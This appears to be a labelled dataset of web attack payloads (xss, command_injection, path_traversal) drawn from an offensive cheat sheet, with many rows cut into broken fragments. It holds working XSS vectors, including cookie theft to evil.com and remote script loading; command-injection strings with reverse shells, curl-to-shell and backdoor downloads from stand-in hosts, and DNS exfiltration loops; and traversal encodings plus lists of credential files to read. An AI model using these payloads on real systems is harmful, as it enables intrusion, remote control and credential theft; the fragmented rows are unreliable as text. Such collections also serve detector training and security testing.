<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
",xss
"html
<svg/onload='fetch(""//host/a"").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
// you can also specify an arbitrary payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
",xss
"javascript
<input type=""hidden"" accesskey=""X"" onclick=""alert(1)"">
Use CTRL+SHIFT+X to trigger the onclick event
",xss
"javascript
<input type=""hidden"" oncontentvisibilityautostatechange=""alert(1)""  style=""content-visibility:auto"" >
",xss
"javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
",xss
"javascript
#""><img src=/ onerror=alert(2)>
",xss
"javascript
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
",xss
"javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the ""javascript:"" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
",xss
"javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src=""data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==""></script>
",xss
"javascript
vbscript:msgbox(""XSS"")
",xss
"xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
",xss
"xml
<html>
<head></head>
<body>
<something:script xmlns:something=""http://www.w3.org/1999/xhtml"">alert(1)</something:script>
</body>
</html>
",xss
"xml
<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">

<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
  <polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
  <script type=""text/javascript"">
    alert(document.domain);
  </script>
</svg>
",xss
"xml
<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">

<svg version=""1.1"" baseProfile=""full"" width=""100"" height=""100"" xmlns=""http://www.w3.org/2000/svg"" onload=""alert('svg attribut')"">
  <polygon id=""lightning"" points=""0,100 50,25 50,75 100,0"" fill=""#ff1919"" stroke=""#ff0000""/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width=""500"" height=""500"">
    <iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert('svg foreignObject iframe');"" width=""400"" height=""250""/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin=""alert('svg animatetransform onbegin')""></animatetransform>
  <script type=""text/javascript"">
    alert('svg script');
  </script>
</svg>
",xss
"javascript
<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
",xss
"

### Nesting SVG and XSS

Including a remote SVG image in a SVG works but won't trigger the XSS embedded in the remote SVG. Author: noraj.

SVG 1.x (xlink:href)

",xss
"xml
<svg width=""200"" height=""200"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">
  <image xlink:href=""http://127.0.0.1:9999/red_lightning_xss_full.svg"" height=""200"" width=""200""/>
</svg>
",xss
"

Including a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's impossible to add vulnerable attribute on a polygon/rect/etc since the ",xss
"xml
<svg width=""200"" height=""200"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">
  <use xlink:href=""http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning""/>
</svg>
",xss
"xml
<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">
  <svg x=""10"">
    <rect x=""10"" y=""10"" height=""100"" width=""100"" style=""fill: #002654""/>
    <script type=""text/javascript"">alert('sub-svg 1');</script>
  </svg>
  <svg x=""200"">
    <rect x=""10"" y=""10"" height=""100"" width=""100"" style=""fill: #ED2939""/>
    <script type=""text/javascript"">alert('sub-svg 2');</script>
  </svg>
</svg>
",xss
"csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
",xss
"html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url(""data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>"");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
",xss
"

## XSS in PostMessage

> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.

",xss
"html
<html>
<body>
    <input type=button value=""Click Me"" id=""btn"">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                ""sender"": ""accounts"",
                ""url"": ""javascript:confirm('XSS')"",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
",xss
"

## Blind XSS

### XSS Hunter

> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.

XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app).

You can set up an alternative version

- Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
- Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)

",xss
"xml
""><script src=""https://js.rip/<custom.name>""></script>
""><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript(""//<custom.subdomain>.xss.ht"")</script>
",xss
"html
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
",xss
"javascript
<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">
",xss
<script>alert('XSS')</script>,xss
<img src=x onerror=alert('XSS')>,xss
<svg/onload=alert('XSS')>,xss
javascript:alert('XSS'),xss
<iframe src=javascript:alert('XSS')>,xss
<body onload=alert('XSS')>,xss
<input onfocus=alert('XSS') autofocus>,xss
<select onfocus=alert('XSS') autofocus>,xss
<textarea onfocus=alert('XSS') autofocus>,xss
<marquee onstart=alert('XSS')>,xss
"'""><script>alert(String.fromCharCode(88,83,83))</script>",xss
<script>fetch('http://evil.com?c='+document.cookie)</script>,xss
<img src=x:alert(alt) onerror=eval(src) alt=xss>,xss
"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",xss
"In the above code, the PHP script uses the `system()` function to execute the `ping` command with the IP address or domain provided by the user through the `ip` GET parameter.",command_injection
"If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.",command_injection
"This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.",command_injection
Execute the command and voila :p,command_injection
"In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands.",command_injection
* `;` (Semicolon): Allows you to execute multiple commands sequentially.,command_injection
* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).,command_injection
* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).,command_injection
"* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.",command_injection
* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.,command_injection
Gain a command execution when you can only append arguments to an existing command.,command_injection
Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.,command_injection
* Chrome,command_injection
```ps1,command_injection
"chrome '--gpu-launcher=""id>/tmp/foo""'",command_injection
```,command_injection
* SSH,command_injection
"ssh '-oProxyCommand=""touch /tmp/foo""' foo@foo",command_injection
* psql,command_injection
psql -o'|id>/tmp/foo',command_injection
Argument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) technique.,command_injection
"In the following example, the payload `＂ --use-askpass=calc ＂` is using **fullwidth double quotes** (U+FF02) instead of the **regular double quotes** (U+0022)",command_injection
"Sometimes, direct command execution from the injection might not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.",command_injection
* curl,command_injection
curl http://evil.attacker.com/ -o webshell.php,command_injection
* Command injection using backticks.,command_injection
```bash,command_injection
original_cmd_by_server `cat /etc/passwd`,command_injection
* Command injection using substitution,command_injection
original_cmd_by_server $(cat /etc/passwd),command_injection
"* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead.",command_injection
```powershell,command_injection
cat${IFS}/etc/passwd,command_injection
ls${IFS}-la,command_injection
"* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.",command_injection
"{cat,/etc/passwd}",command_injection
* Input redirection. The < character tells the shell to read the contents of the file specified.,command_injection
cat</etc/passwd,command_injection
sh</dev/tcp/127.0.0.1/4242,command_injection
* ANSI-C Quoting,command_injection
X=$'uname\x20-a'&&$X,command_injection
"* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.",command_injection
;ls%09-al%09/home,command_injection
"* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.",command_injection
"ping%CommonProgramFiles:~10,-18%127.0.0.1",command_injection
"ping%PROGRAMFILES:~10,-5%127.0.0.1",command_injection
Commands can also be run in sequence with newlines,command_injection
* Commands can be broken into parts by using backslash followed by a newline,command_injection
$ cat /et\,command_injection
c/pa\,command_injection
sswd,command_injection
* URL encoded form would look like this:,command_injection
cat%20/et%5C%0Ac/pa%5C%0Asswd,command_injection
Commands execution without backslash and slash - linux bash,command_injection
"`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.",command_injection
"Windows does not distinguish between uppercase and lowercase letters when interpreting commands or file paths. For example, `DIR`, `dir`, or `DiR` will all execute the same `dir` command.",command_injection
Extracting data char by char and detect the correct value based on the delay.,command_injection
* Correct value: wait 5 seconds,command_injection
swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi,command_injection
real    0m5.007s,command_injection
user    0m0.000s,command_injection
sys 0m0.000s,command_injection
* Incorrect value: no delay,command_injection
swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi,command_injection
real    0m0.002s,command_injection
"Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)",command_injection
1. Go to [dnsbin.zhack.ca](http://dnsbin.zhack.ca),command_injection
2. Execute a simple 'ls',command_injection
"for i in $(ls /) ; do host ""$i.3a43c7e4e57a8d0e2057.d.zhack.ca""; done",command_injection
Online tools to check for DNS based data exfiltration:,command_injection
* [dnsbin.zhack.ca](http://dnsbin.zhack.ca),command_injection
* [app.interactsh.com](https://app.interactsh.com),command_injection
* [portswigger.net](https://portswigger.net/burp/documentation/collaborator),command_injection
"A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about ""polyglot command injection,"" we're referring to an injection payload that can be executed in multiple contexts or environments.",command_injection
* Example 1:,command_injection
"Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",command_injection
"echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",command_injection
"echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",command_injection
"echo ""1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",command_injection
* Example 2:,command_injection
"Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/",command_injection
"echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/",command_injection
"echo ""YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/""",command_injection
"echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/'",command_injection
"In some instances, you might have a long running command that gets killed by the process injecting it timing out.",command_injection
"Using `nohup`, you can keep the process running after the parent process exits.",command_injection
"In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.",command_injection
"* [PortSwigger - OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)",command_injection
* [PortSwigger - Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays),command_injection
* [PortSwigger - Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection),command_injection
* [PortSwigger - Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band),command_injection
* [PortSwigger - Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration),command_injection
* [Root Me - PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection),command_injection
* [Root Me - Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass),command_injection
* [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert),command_injection
* [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace),command_injection
"Challenge based on the previous tricks, what does the following command do:",command_injection
"php
<?php
    $ip = $_GET['ip'];
    system(""ping -c 4 "" . $ip);
?>
",command_injection
"powershell
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
",command_injection
"ps1
    chrome '--gpu-launcher=""id>/tmp/foo""'
    ",command_injection
"ps1
    ssh '-oProxyCommand=""touch /tmp/foo""' foo@foo
    ",command_injection
"ps1
    psql -o'|id>/tmp/foo'
    ",command_injection
"php
$url = ""https://example.tld/"" . $_GET['path'] . "".txt"";
system(""wget.exe -q "" . escapeshellarg($url));
",command_injection
"ps1
    # -o, --output <file>        Write to file instead of stdout
    curl http://evil.attacker.com/ -o webshell.php
    ",command_injection
; use ,command_injection
"

* Input redirection. The < character tells the shell to read the contents of the file specified.

  ",command_injection
"powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ",command_injection
"powershell
  X=$'uname\x20-a'&&$X
  ",command_injection
"powershell
  ;ls%09-al%09/home
  ",command_injection
"powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$""whoami"",}
{,/?s?/?i?/c?t,/e??/p??s??,}
",command_injection
"powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '""-1'
/

swissky@crashlab:~$ tr '!-0' '""-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '""-1')etc$(echo . | tr '!-0' '""-1')passwd
root:x:0:0:root:/root:/bin/bash
",command_injection
"powershell
swissky@crashlab:~$ echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""
/etc/passwd

swissky@crashlab:~$ cat ",command_injection
"
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ ",command_injection
"
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat ",command_injection
"
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat ",command_injection
"powershell
w'h'o'am'i
wh''oami
'w'hoami
",command_injection
"powershell
w""h""o""am""i
wh""""oami
""wh""oami
",command_injection
": Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, ",command_injection
"powershell
who$@ami
echo whoami|$0
",command_injection
"powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
  ",command_injection
"powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
  ",command_injection
"

### Dns Based Data Exfiltration

Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. Go to [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
2. Execute a simple 'ls'

  ",command_injection
"powershell
  for i in $(ls /) ; do host ""$i.3a43c7e4e57a8d0e2057.d.zhack.ca""; done
  ",command_injection
"

Online tools to check for DNS based data exfiltration:

* [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
* [app.interactsh.com](https://app.interactsh.com)
* [portswigger.net](https://portswigger.net/burp/documentation/collaborator)

## Polyglot Command Injection

A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about ""polyglot command injection,"" we're referring to an injection payload that can be executed in multiple contexts or environments.

* Example 1:

  ",command_injection
"powershell
  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}

  # Context inside commands with single and double quote:
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}
  echo ""1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}
  ",command_injection
*/-sleep(5)-'/*$(sleep 5),command_injection
" #*/-sleep(5)||'""||sleep(5)||""/*",command_injection
"bash
nohup sleep 120 > /dev/null &
",command_injection
"powershell
g=""/e""\h""hh""/hm""t""c/\i""sh""hh/hmsu\e;tac$@<${g//hh??hm/}
",command_injection
; ls,command_injection
| cat /etc/passwd,command_injection
&& whoami,command_injection
|| ping -c 10 127.0.0.1,command_injection
; curl http://evil.com/shell.sh | sh,command_injection
`whoami`,command_injection
$(whoami),command_injection
; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,command_injection
| nc -e /bin/sh 10.0.0.1 4444,command_injection
&& wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor,command_injection
"; python -c 'import socket,subprocess,os;...'",command_injection
| perl -e 'use Socket;...',command_injection
"We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.",path_traversal
| Character | Encoded |,path_traversal
| --- | -------- |,path_traversal
| `.` | `%2e` |,path_traversal
| `/` | `%2f` |,path_traversal
| `\` | `%5c` |,path_traversal
**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion,path_traversal
"Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.",path_traversal
| `.` | `%252e` |,path_traversal
| `/` | `%252f` |,path_traversal
| `\` | `%255c` |,path_traversal
**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271),path_traversal
| `.` | `%u002e` |,path_traversal
| `/` | `%u2215` |,path_traversal
| `\` | `%u2216` |,path_traversal
**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315),path_traversal
"The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as ""overlong"" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.",path_traversal
"| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |",path_traversal
"| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |",path_traversal
"| `\` | `%c0%5c`, `%c0%80%5c` |",path_traversal
"Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.",path_traversal
**Example:**: Mirasys DVMS Workstation <=5.12.6,path_traversal
"A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.",path_traversal
**Example:** Homematic CCU3 CVE-2019-9726,path_traversal
**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575,path_traversal
Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.,path_traversal
**Example**: Pascom Cloud Phone System CVE-2021-45967,path_traversal
"A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.",path_traversal
These exploits affect mechanism linked to specific technologies.,path_traversal
"A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.",path_traversal
An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.,path_traversal
"Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.",path_traversal
"When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.",path_traversal
"For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID.",path_traversal
| .NET Version   | URI                        |,path_traversal
| -------------- | -------------------------- |,path_traversal
"| V1.0, V1.1     | /(XXXXXXXX)/               |",path_traversal
| V2.0+          | /(S(XXXXXXXX))/            |,path_traversal
| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |,path_traversal
| V2.0+          | ...                        |,path_traversal
We can use this behavior to bypass filtered URLs.,path_traversal
* If your application is in the main folder,path_traversal
```ps1,path_traversal
/(S(X))/,path_traversal
/(Y(Z))/,path_traversal
/(G(AAA-BBB)D(CCC=DDD)E(0-1))/,path_traversal
/(S(X))/admin/(S(X))/main.aspx,path_traversal
/(S(x))/b/(S(x))in/Navigator.dll,path_traversal
```,path_traversal
* If your application is in a subfolder,path_traversal
/MyApp/(S(X))/,path_traversal
/admin/(S(X))/main.aspx,path_traversal
/admin/Foobar/(S(X))/../(S(X))/main.aspx,path_traversal
| CVE            | Payload                                        |,path_traversal
| -------------- | ---------------------------------------------- |,path_traversal
| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  |,path_traversal
| -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |,path_traversal
| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |,path_traversal
| -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |,path_traversal
The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.,path_traversal
* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner),path_traversal
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/',path_traversal
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/',path_traversal
* [bitquark/shortscan](https://github.com/bitquark/shortscan),path_traversal
shortscan http://example.org/,path_traversal
Java's URL protocol when `new URL('')` is used allows the format `url:URL`,path_traversal
* Operating System and Informations,path_traversal
```powershell,path_traversal
/etc/issue,path_traversal
/etc/group,path_traversal
/etc/hosts,path_traversal
/etc/motd,path_traversal
* Processes,path_traversal
"/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor",path_traversal
/proc/self/environ,path_traversal
/proc/version,path_traversal
/proc/cmdline,path_traversal
/proc/sched_debug,path_traversal
/proc/mounts,path_traversal
* Network,path_traversal
/proc/net/arp,path_traversal
/proc/net/route,path_traversal
/proc/net/tcp,path_traversal
/proc/net/udp,path_traversal
* Current Path,path_traversal
/proc/self/cwd/index.php,path_traversal
/proc/self/cwd/main.py,path_traversal
* Indexing,path_traversal
/var/lib/mlocate/mlocate.db,path_traversal
/var/lib/plocate/plocate.db,path_traversal
/var/lib/mlocate.db,path_traversal
* Credentials and history,path_traversal
/etc/passwd,path_traversal
/etc/shadow,path_traversal
/home/$USER/.bash_history,path_traversal
/home/$USER/.ssh/id_rsa,path_traversal
/etc/mysql/my.cnf,path_traversal
* Kubernetes,path_traversal
/run/secrets/kubernetes.io/serviceaccount/token,path_traversal
/run/secrets/kubernetes.io/serviceaccount/namespace,path_traversal
/run/secrets/kubernetes.io/serviceaccount/certificate,path_traversal
/var/run/secrets/kubernetes.io/serviceaccount,path_traversal
"The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.",path_traversal
A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread),path_traversal
"

### URL Encoding

| Character | Encoded |
| --- | -------- |
| ",path_traversal
" |

**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion

",path_traversal
"

### Double URL Encoding

Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.

| Character | Encoded |
| --- | -------- |
| ",path_traversal
" |

**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)

",path_traversal
"

### Unicode Encoding

| Character | Encoded |
| --- | -------- |
| ",path_traversal
" |

**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)

",path_traversal
"

### Overlong UTF-8 Unicode Encoding

The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as ""overlong"" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.

| Character | Encoded |
| --- | -------- |
| ",path_traversal
" |

### Mangled Path

Sometimes you encounter a WAF which remove the ",path_traversal
"

**Example:**: Mirasys DVMS Workstation <=5.12.6

",path_traversal
"powershell
..;/
",path_traversal
"js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
",path_traversal
" is the Session ID.

| .NET Version   | URI                        |
| -------------- | -------------------------- |
| V1.0, V1.1     | /(XXXXXXXX)/               |
| V2.0+          | /(S(XXXXXXXX))/            |
| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+          | ...                        |

We can use this behavior to bypass filtered URLs.

* If your application is in the main folder

    ",path_traversal
"

| CVE            | Payload                                        |
| -------------- | ---------------------------------------------- |
| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  |
| -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |
| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |
| -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |

### IIS Short Name

The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.

* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

    ",path_traversal
"ps1
